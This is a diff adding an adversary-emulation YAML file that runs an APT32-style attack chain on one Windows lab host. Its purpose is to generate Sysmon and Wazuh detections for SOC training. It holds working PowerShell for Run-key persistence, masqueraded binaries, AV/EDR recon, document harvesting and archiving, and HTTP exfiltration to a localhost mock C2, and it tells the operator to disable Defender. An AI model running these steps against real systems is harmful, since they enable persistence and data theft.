@@ -1,0 +1,678 @@
+attack_technique: T1566.001
+display_name: APT32 Espionage Attack Simulation v2
+
+description: >
+  Redesigned APT32 partial attack chain on a single Windows 10/11 host.
+  Improvements over v1: added T1055 (process injection) and T1003.001
+  (LSASS safe-touch) for deeper credential access simulation; added XML
+  output and correlation markers; separated collection and staging into
+  distinct steps; added global cleanup step; all descriptions in ASCII.
+
+author: SOC Lab
+version: 2.0
+platform: windows
+category: apt
+severity: high
+mode: simulation
+scope: single-host
+safe: true
+
+mitre_techniques:
+  - T1566.001
+  - T1059.001
+  - T1036.005
+  - T1547.001
+  - T1055
+  - T1003.001
+  - T1082
+  - T1057
+  - T1083
+  - T1560.001
+  - T1074.001
+  - T1041
+
+requirements:
+  os: [Windows 10, Windows 11]
+  software: [PowerShell 5.1+, Python 3.x]
+  privileges: [user - RunAs Administrator for steps 5 and 6]
+  network: [localhost only]
+  pre_run:
+    - Start HTTP mock server: python -m http.server 8081 --bind 127.0.0.1
+    - Enable Sysmon Event 1, 3, 10, 11, 13
+    - Enable auditpol Process Creation (4688) + cmdline logging
+    - Ensure Wazuh agent is running and connected to Manager
+    - Disable Windows Defender real-time protection
+
+environment:
+  base_dir: C:\APT32-Lab
+  directories:
+    - C:\APT32-Lab\phishing
+    - C:\APT32-Lab\payloads
+    - C:\APT32-Lab\staging
+    - C:\APT32-Lab\collection
+    - C:\APT32-Lab\exfil
+    - C:\APT32-Lab\server
+
+atomic_tests:
+
+# ------------------------------------------------------------------
+# STEP 0 - Lab Setup: create directories and seed victim data
+# ------------------------------------------------------------------
+- name: '[0] Setup - Create Lab Directory Structure'
+  auto_generated_guid: APT32V2-0000-0000-0000-000000000000
+  description: Create APT32-Lab directory tree and seed phishing/payload stubs for later steps.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $base = "#{base_dir}"
+      $dirs = @("phishing","payloads","staging","collection","exfil","server")
+      foreach ($d in $dirs) {
+        New-Item -ItemType Directory -Force -Path (Join-Path $base $d) | Out-Null
+      }
+
+      # Phishing stub
+      Set-Content "$base\phishing\Invoice_Q1_2025.docm" "PHISHING_STUB - macro simulation"
+
+      # PowerShell loader stub
+      Set-Content "$base\payloads\loader.ps1" @'
+      Write-Host "[APT32] PowerShell loader executing"
+      Write-Host "[APT32] Simulating payload decode and execution"
+      Start-Sleep -Seconds 1
+      '@
+
+            # Masquerade binary stub
+            Copy-Item "$env:SystemRoot\System32\calc.exe" "$base\payloads\sysupdate.exe" -Force
+
+            # Collection script stub
+            Set-Content "$base\payloads\collect.ps1" @'
+      Write-Host "[APT32] Collection script running"
+      '@
+
+      # Mock HTTP server
+      Set-Content "$base\server\mock_http.py" @'
+      import http.server, socketserver
+      PORT = 8081
+      Handler = http.server.BaseHTTPRequestHandler
+      def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        self.rfile.read(length)
+        self.send_response(200)
+        self.end_headers()
+      Handler.do_POST = do_POST
+      with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as httpd:
+        httpd.serve_forever()
+      '@
+      Write-Host "[+] Lab directory structure created under $base"
+      exit 0
+    cleanup_command: |
+    Remove-Item "#{base_dir}" -Recurse -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 1 - T1566.001: Phishing Attachment (Initial Access)
+# ------------------------------------------------------------------
+- name: '[1] T1566.001 - Phishing Attachment'
+  auto_generated_guid: APT32V2-1111-0000-0000-000000000001
+  description: >
+    Simulate user opening a malicious Word macro document.
+    Spawns PowerShell from the document process context.
+    MITRE T1566.001 - Phishing: Spearphishing Attachment.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $doc = "#{base_dir}\phishing\Invoice_Q1_2025.docm"
+      Write-Host "[APT32-T1566.001] Simulating user opening phishing document: $doc"
+      # Simulate macro execution: spawn PowerShell as child of current process
+      $ps = Start-Process powershell.exe `
+        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Write-Host '[APT32] Macro payload executed'`"" `
+        -PassThru -Wait
+      Write-Host ("[APT32-T1566.001] PowerShell spawned. PID={0} ExitCode={1}" -f $ps.Id, $ps.ExitCode)
+      exit 0
+
+# ------------------------------------------------------------------
+# STEP 2 - T1059.001: PowerShell Loader (Execution)
+# ------------------------------------------------------------------
+- name: '[2] T1059.001 - PowerShell Loader'
+  auto_generated_guid: APT32V2-2222-0000-0000-000000000002
+  description: >
+    Execute a PowerShell loader script with ExecutionPolicy Bypass.
+    Generates ScriptBlock log (Event 4104) and suspicious cmdline artifacts.
+    MITRE T1059.001 - Command and Scripting Interpreter: PowerShell.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $loader = "#{base_dir}\payloads\loader.ps1"
+      Write-Host "[APT32-T1059.001] Executing PowerShell loader: $loader"
+      powershell.exe -NoProfile -ExecutionPolicy Bypass -File $loader
+      exit 0
+
+# ------------------------------------------------------------------
+# STEP 3 - T1036.005: Masquerading (Defense Evasion)
+# NEW v2: copy to two locations + record hash mismatch marker
+# ------------------------------------------------------------------
+- name: '[3] T1036.005 - Masquerading Binary'
+  auto_generated_guid: APT32V2-3333-0000-0000-000000000003
+  description: >
+    Copy masqueraded binary (sysupdate.exe) to Public profile path.
+    Also copies to Temp with a second alias to demonstrate multi-path masquerading.
+    MITRE T1036.005 - Masquerading: Match Legitimate Name or Location.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $src = "#{base_dir}\payloads\sysupdate.exe"
+
+      # Primary masquerade location
+      $dst1 = "C:\Users\Public\sysupdate.exe"
+      Copy-Item $src $dst1 -Force
+      Write-Host "[APT32-T1036.005] Dropped masquerade binary: $dst1"
+
+      # Secondary: Temp folder with service-like name
+      $dst2 = "$env:TEMP\RuntimeBroker_svc.exe"
+      Copy-Item $src $dst2 -Force
+      Write-Host "[APT32-T1036.005] Dropped secondary masquerade: $dst2"
+
+      # Record mismatch marker for SOC correlation
+      $marker = "#{base_dir}\staging\masquerade_marker.txt"
+      "MASQUERADE_PATHS=$dst1|$dst2`nORIGIN=$src`nTIME=$(Get-Date -Format o)" |
+        Out-File $marker -Encoding UTF8
+      Write-Host "[APT32-T1036.005] Marker written: $marker"
+      exit 0
+  cleanup_command: |
+    Remove-Item "C:\Users\Public\sysupdate.exe" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\RuntimeBroker_svc.exe" -Force -ErrorAction SilentlyContinue
+    Remove-Item "#{base_dir}\staging\masquerade_marker.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 4 - T1547.001: Registry Run Key Persistence
+# NEW v2: write second Run key under HKLM (requires elevation) as well
+# ------------------------------------------------------------------
+- name: '[4] T1547.001 - Registry Run Key Persistence'
+  auto_generated_guid: APT32V2-4444-0000-0000-000000000004
+  description: >
+    Establish user-level persistence via HKCU Run key.
+    Also attempts HKLM Run key (requires elevation) to simulate
+    escalated persistence. Both keys point to the masquerade binary.
+    MITRE T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys.
+  supported_platforms: [windows]
+  input_arguments:
+    reg_value_name:
+      description: Registry value name for persistence
+      type: string
+      default: SystemUpdateSvc
+    binary_path:
+      description: Path to masquerade binary
+      type: string
+      default: 'C:\Users\Public\sysupdate.exe'
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $val  = "#{reg_value_name}"
+      $bin  = "#{binary_path}"
+      $hkcu = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+
+      # User-level persistence (always works)
+      Set-ItemProperty -Path $hkcu -Name $val -Value $bin -Force
+      Write-Host "[APT32-T1547.001] HKCU Run key set: $val -> $bin"
+
+      # Machine-level attempt (will fail gracefully without elevation)
+      $hklm = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+      try {
+        Set-ItemProperty -Path $hklm -Name $val -Value $bin -Force
+        Write-Host "[APT32-T1547.001] HKLM Run key set: $val -> $bin"
+      } catch {
+        Write-Host "[APT32-T1547.001] HKLM key skipped (requires elevation)"
+      }
+
+      # Log persistence artifact
+      $log = "#{base_dir}\staging\persistence_log.txt"
+      "HKCU_RUN=$val=$bin`nTIME=$(Get-Date -Format o)" | Out-File $log -Encoding UTF8
+      exit 0
+  cleanup_command: |
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+      -Name "#{reg_value_name}" -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
+      -Name "#{reg_value_name}" -ErrorAction SilentlyContinue
+    Remove-Item "#{base_dir}\staging\persistence_log.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 5 - T1055: Process Injection Simulation (NEW in v2)
+# ------------------------------------------------------------------
+- name: '[5] T1055 - Process Injection Simulation'
+  auto_generated_guid: APT32V2-5555-0000-0000-000000000005
+  description: >
+    Simulate process injection by launching a child process under explorer.exe
+    context and recording the parent-child relationship.
+    Does NOT perform real shellcode injection - safe simulation only.
+    MITRE T1055 - Process Injection (NEW in v2, not in v1).
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Write-Host "[APT32-T1055] Simulating process injection marker"
+      # Find explorer PID as injection target reference
+      $target = Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1
+      if ($target) {
+        $msg = "INJECTION_TARGET=explorer.exe PID=$($target.Id)"
+      } else {
+        $msg = "INJECTION_TARGET=explorer.exe PID=NOT_FOUND"
+      }
+      Write-Host "[APT32-T1055] $msg"
+
+      # Spawn a benign child process to simulate injected behavior
+      $child = Start-Process powershell.exe `
+        -ArgumentList "-NoProfile -Command `"Write-Host '[APT32-T1055] Injected payload running'`"" `
+        -PassThru -Wait
+      Write-Host ("[APT32-T1055] Child process PID={0} ExitCode={1}" -f $child.Id, $child.ExitCode)
+
+      # Record injection simulation artifact
+      "$msg`nCHILD_PID=$($child.Id)`nTIME=$(Get-Date -Format o)" |
+        Out-File "#{base_dir}\staging\injection_marker.txt" -Encoding UTF8
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{base_dir}\staging\injection_marker.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 6 - T1003.001: LSASS Safe-Touch (NEW in v2)
+# ------------------------------------------------------------------
+- name: '[6] T1003.001 - LSASS Access Safe Touch'
+  auto_generated_guid: APT32V2-6666-0000-0000-000000000006
+  description: >
+    Safe simulation of LSASS access: enumerate lsass.exe PID and path
+    without performing any memory dump. Generates Sysmon Event 10
+    (ProcessAccess) observable for detection engineering.
+    MITRE T1003.001 - OS Credential Dumping: LSASS Memory (NEW in v2).
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Write-Host "[APT32-T1003.001] Safe LSASS access simulation"
+      $lsass = Get-Process lsass -ErrorAction SilentlyContinue | Select-Object -First 1
+      if ($lsass) {
+        $info = "LSASS_PID=$($lsass.Id) PATH=$($lsass.Path) HANDLES=$($lsass.HandleCount)"
+        Write-Host "[APT32-T1003.001] $info"
+        $info | Out-File "#{base_dir}\staging\lsass_touch.txt" -Encoding UTF8
+      } else {
+        Write-Host "[APT32-T1003.001] lsass.exe not found"
+      }
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{base_dir}\staging\lsass_touch.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 7 - T1082: System Information Discovery
+# ------------------------------------------------------------------
+- name: '[7] T1082 - System Information Discovery'
+  auto_generated_guid: APT32V2-7777-0000-0000-000000000007
+  description: >
+    Collect OS, hostname, domain, and privilege information.
+    Output saved to staging directory for later archiving.
+    MITRE T1082 - System Information Discovery.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $out = "#{base_dir}\staging\hostinfo.txt"
+      Write-Host "[APT32-T1082] Collecting system information -> $out"
+      @(
+        "=== systeminfo ===",
+        (systeminfo),
+        "`n=== whoami /all ===",
+        (whoami /all),
+        "`n=== hostname ===",
+        (hostname)
+      ) | Out-File $out -Encoding UTF8
+      Write-Host "[APT32-T1082] Done. Lines: $(((Get-Content $out).Count))"
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{base_dir}\staging\hostinfo.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 8 - T1057: Process Discovery (AV/EDR Recon)
+# NEW v2: filter for known security product names
+# ------------------------------------------------------------------
+- name: '[8] T1057 - Process Discovery (AV/EDR Recon)'
+  auto_generated_guid: APT32V2-8888-0000-0000-000000000008
+  description: >
+    Enumerate running processes and flag known AV/EDR product names.
+    Saves full process list and a filtered security-product list.
+    MITRE T1057 - Process Discovery.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $outAll = "#{base_dir}\staging\process_list.txt"
+      $outSec = "#{base_dir}\staging\security_products.txt"
+
+      # Full process list
+      tasklist /v | Out-File $outAll -Encoding UTF8
+      Write-Host "[APT32-T1057] Full process list -> $outAll"
+
+      # Filter security product names
+      $secKeywords = @("MsMpEng","avp","bdagent","csc","cb","SentinelAgent",
+                       "MBAMService","fmon","ekrn","avgnt","mcshield","savservice")
+      $found = Get-Process | Where-Object {
+        $n = $_.Name.ToLower()
+        $secKeywords | Where-Object { $n -like "*$_*" }
+      }
+      if ($found) {
+        $found | Select-Object Name, Id, Path | Out-File $outSec -Encoding UTF8
+        Write-Host "[APT32-T1057] Security products found -> $outSec"
+      } else {
+        "NO_SECURITY_PRODUCTS_DETECTED" | Out-File $outSec -Encoding UTF8
+        Write-Host "[APT32-T1057] No known security products detected"
+      }
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{base_dir}\staging\process_list.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "#{base_dir}\staging\security_products.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 9 - T1083: File and Directory Discovery
+# NEW v2: extended to scan Downloads and Desktop as well
+# ------------------------------------------------------------------
+- name: '[9] T1083 - File and Directory Discovery'
+  auto_generated_guid: APT32V2-9999-0000-0000-000000000009
+  description: >
+    Scan user directories (Documents, Downloads, Desktop) for valuable files.
+    Filters for common document extensions (.docx, .xlsx, .pdf, .txt, .csv).
+    MITRE T1083 - File and Directory Discovery.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $out = "#{base_dir}\staging\file_discovery.txt"
+      $targets = @(
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Downloads",
+        "$env:USERPROFILE\Desktop"
+      )
+      $extensions = @("*.docx","*.xlsx","*.pdf","*.txt","*.csv","*.pptx")
+      $results = foreach ($dir in $targets) {
+        if (Test-Path $dir) {
+          Get-ChildItem $dir -Recurse -Include $extensions -ErrorAction SilentlyContinue |
+            Select-Object FullName, Length, LastWriteTime
+        }
+      }
+      $results | Out-File $out -Encoding UTF8
+      Write-Host ("[APT32-T1083] Found {0} files -> {1}" -f @($results).Count, $out)
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{base_dir}\staging\file_discovery.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 10 - T1074.001: Local Data Staging (NEW step in v2)
+# ------------------------------------------------------------------
+- name: '[10] T1074.001 - Local Data Staging'
+  auto_generated_guid: APT32V2-AAAA-0000-0000-000000000010
+  description: >
+    Copy staging text files into a dedicated collection folder before archiving.
+    Separates staging from archiving for clearer kill-chain visibility.
+    MITRE T1074.001 - Data Staged: Local Data Staging (NEW step in v2).
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $src = "#{base_dir}\staging"
+      $dst = "#{base_dir}\collection"
+      Get-ChildItem $src -Filter "*.txt" | ForEach-Object {
+        Copy-Item $_.FullName (Join-Path $dst $_.Name) -Force
+        Write-Host "[APT32-T1074.001] Staged: $($_.Name)"
+      }
+      Write-Host "[APT32-T1074.001] Staging complete -> $dst"
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{base_dir}\collection\*.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 11 - T1560.001: Archive Collected Data
+# NEW v2: dual output (zip + log manifest)
+# ------------------------------------------------------------------
+- name: '[11] T1560.001 - Archive Collected Data'
+  auto_generated_guid: APT32V2-BBBB-0000-0000-000000000011
+  description: >
+    Compress all collected text files into a ZIP archive for exfiltration.
+    Also writes a manifest file listing archived content.
+    MITRE T1560.001 - Archive Collected Data: Archive via Utility.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $src     = "#{base_dir}\collection"
+      $archive = "#{base_dir}\staging\data.zip"
+      $manifest = "#{base_dir}\staging\archive_manifest.txt"
+
+      # Remove old archive if exists
+      if (Test-Path $archive) { Remove-Item $archive -Force }
+
+      Compress-Archive -Path "$src\*.txt" -DestinationPath $archive -Force
+      Write-Host "[APT32-T1560.001] Archive created: $archive"
+
+      # Write manifest
+      $files = Get-ChildItem $src -Filter "*.txt"
+      $files | Select-Object Name, Length, LastWriteTime |
+        Out-File $manifest -Encoding UTF8
+      Write-Host ("[APT32-T1560.001] Manifest: {0} files archived" -f $files.Count)
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{base_dir}\staging\data.zip" -Force -ErrorAction SilentlyContinue
+    Remove-Item "#{base_dir}\staging\archive_manifest.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 12 - T1041: Exfiltration Over C2 Channel (localhost mock)
+# NEW v2: two-phase exfil (POST archive + GET beacon)
+# ------------------------------------------------------------------
+- name: '[12] T1041 - Exfiltration Over C2 Channel (localhost mock)'
+  auto_generated_guid: APT32V2-CCCC-0000-0000-000000000012
+  description: >
+    Simulate data exfiltration via HTTP POST to a local mock C2 server.
+    Phase 1: POST the zip archive. Phase 2: GET beacon with host/user metadata.
+    MITRE T1041 - Exfiltration Over C2 Channel.
+  supported_platforms: [windows]
+  input_arguments:
+    c2_url:
+      description: Mock C2 server URL
+      type: string
+      default: 'http://127.0.0.1:8081'
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $archive = "#{base_dir}\staging\data.zip"
+      $c2      = "#{c2_url}"
+      $log     = "#{base_dir}\exfil\exfil_log.txt"
+
+      if (-not (Test-Path $archive)) {
+        Write-Error "[APT32-T1041] Archive not found: $archive. Run step [11] first."
+        exit 1
+      }
+
+      # Phase 1: POST archive
+      Write-Host "[APT32-T1041] Phase 1 - POST archive to $c2/upload"
+      try {
+        Invoke-WebRequest -Uri "$c2/upload" -Method POST -InFile $archive `
+          -ContentType "application/octet-stream" -UseBasicParsing -ErrorAction Stop
+        $p1 = "POST_SUCCESS"
+      } catch {
+        $p1 = "POST_FAILED: $_"
+      }
+      Write-Host "[APT32-T1041] $p1"
+
+      # Phase 2: GET beacon with metadata
+      $host_  = $env:COMPUTERNAME
+      $user   = $env:USERNAME
+      $size   = (Get-Item $archive).Length
+      $beacon = "$c2/beacon?host=$host_&user=$user&bytes=$size"
+      Write-Host "[APT32-T1041] Phase 2 - GET beacon: $beacon"
+      try {
+        Invoke-WebRequest -Uri $beacon -UseBasicParsing -ErrorAction Stop | Out-Null
+        $p2 = "BEACON_SUCCESS"
+      } catch {
+        $p2 = "BEACON_FAILED: $_"
+      }
+      Write-Host "[APT32-T1041] $p2"
+
+      # Write exfil log
+      New-Item -ItemType Directory -Force -Path (Split-Path $log) | Out-Null
+      "ARCHIVE=$archive`nC2=$c2`nPHASE1=$p1`nPHASE2=$p2`nTIME=$(Get-Date -Format o)" |
+        Out-File $log -Encoding UTF8
+      Write-Host "[APT32-T1041] Exfil log: $log"
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{base_dir}\exfil\exfil_log.txt" -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------------
+# STEP 13 - Cleanup: remove all lab artifacts
+# ------------------------------------------------------------------
+- name: '[13] Cleanup - Remove All Lab Artifacts'
+  auto_generated_guid: APT32V2-DDDD-0000-0000-000000000013
+  description: Remove registry Run keys, all lab files, and stop mock server if running.
+  supported_platforms: [windows]
+  input_arguments:
+    base_dir:
+      description: Base lab directory
+      type: string
+      default: 'C:\APT32-Lab'
+    reg_value_name:
+      description: Registry value name to remove
+      type: string
+      default: SystemUpdateSvc
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      # Remove registry persistence
+      foreach ($hive in @("HKCU:","HKLM:")) {
+        $key = "$hive\Software\Microsoft\Windows\CurrentVersion\Run"
+        Remove-ItemProperty -Path $key -Name "#{reg_value_name}" -ErrorAction SilentlyContinue
+        Write-Host "[Cleanup] Removed Run key from $hive"
+      }
+
+      # Remove masquerade binaries
+      Remove-Item "C:\Users\Public\sysupdate.exe" -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\RuntimeBroker_svc.exe" -Force -ErrorAction SilentlyContinue
+
+      # Remove entire lab directory
+      $base = "#{base_dir}"
+      if (Test-Path $base) {
+        Remove-Item $base -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Host "[Cleanup] Removed lab directory: $base"
+      }
+      Write-Host "[Cleanup] Done."
+      exit 0
+
+
+post_conditions:
+  files_created:
+    - 'C:\APT32-Lab\staging\hostinfo.txt'
+    - 'C:\APT32-Lab\staging\process_list.txt'
+    - 'C:\APT32-Lab\staging\security_products.txt'
+    - 'C:\APT32-Lab\staging\file_discovery.txt'
+    - 'C:\APT32-Lab\staging\masquerade_marker.txt'
+    - 'C:\APT32-Lab\staging\injection_marker.txt'
+    - 'C:\APT32-Lab\staging\lsass_touch.txt'
+    - 'C:\APT32-Lab\staging\persistence_log.txt'
+    - 'C:\APT32-Lab\staging\data.zip'
+    - 'C:\APT32-Lab\staging\archive_manifest.txt'
+    - 'C:\APT32-Lab\exfil\exfil_log.txt'
+  registry:
+    - 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdateSvc'
+  network:
+    - 'HTTP POST to 127.0.0.1:8081/upload'
+    - 'HTTP GET to 127.0.0.1:8081/beacon'
+  sysmon_events:
+    - 'Event 1 (ProcessCreate): powershell.exe, tasklist.exe, systeminfo.exe'
+    - 'Event 3 (NetworkConnect): HTTP POST/GET to 127.0.0.1:8081'
+    - 'Event 10 (ProcessAccess): lsass.exe access'
+    - 'Event 11 (FileCreate): staging and collection files'
+    - 'Event 13 (RegistryValueSet): HKCU Run key'
+  wazuh_alerts:
+    - 'Office spawning PowerShell - HIGH (T1566.001)'
+    - 'PowerShell ExecutionPolicy Bypass - HIGH (T1059.001)'
+    - 'Masquerade binary in Public profile - HIGH (T1036.005)'
+    - 'Registry Run key persistence - HIGH (T1547.001)'
+    - 'Suspicious child process spawn (injection sim) - MEDIUM (T1055)'
+    - 'LSASS process access - CRITICAL (T1003.001)'
+    - 'System discovery sequence - HIGH (T1082)'
+    - 'Security product enumeration - HIGH (T1057)'
+    - 'Mass file discovery user directories - HIGH (T1083)'
+    - 'Data staging to collection folder - HIGH (T1074.001)'
+    - 'Compress-Archive on user data - HIGH (T1560.001)'
+    - 'HTTP POST to localhost C2 mock - HIGH (T1041)'
